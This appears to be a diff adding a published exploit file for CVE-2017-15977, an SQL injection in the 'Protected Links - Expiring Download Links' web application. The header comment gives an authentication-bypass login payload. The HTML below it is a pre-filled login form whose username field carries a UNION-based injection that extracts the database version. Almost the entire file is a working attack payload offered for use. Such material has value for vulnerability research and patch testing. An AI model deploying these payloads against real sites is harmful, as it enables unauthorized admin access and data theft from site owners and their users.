@@ -1,0 +1,46 @@
+<!--
+# # # # # 
+# Exploit Title: Protected Links - Expiring Download Links - SQL Injection
+# Dork: N/A
+# Date: 30.10.2017
+# Vendor Homepage: http://sixthlife.net/
+# Software Link: https://codecanyon.net/item/protected-links-expiring-download-links/2556861
+# Demo: http://protectedlinks.net/demo/
+# Version: N/A
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2017-15977
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# http://localhost/[PATH]/admin
+# 
+# User: 'or 1=1 or ''=' Pass: anything
+# 
+# Etc..
+# # # # #
+-->
+<form name="login" method="post" action="http://localhost/[PATH]/index.php">
+<div id="login">
+<table width="200" border="0">
+<tr>
+<td height="45"><p>Username</p></td>
+<td><label for="textfield"></label>
+<input type="text" name="username" id="textfield" value="' UNION ALL SELECT 1,CONCAT(VERSiON(),0x494853414e2053454e43414e),3,4,CONCAT(0x494853414e2053454e43414e)-- Ver Ayari"/></td>
+</tr>
+<tr>
+<td height="45">Password</td>
+<td><label for="textfield"></label>
+<input type="password" name="password" id="textfield" value="Ver Ayari"/></td>
+</tr>
+</table>
+</div>
+<input type="submit" name="submit" value="LOGIN" />
+</form>
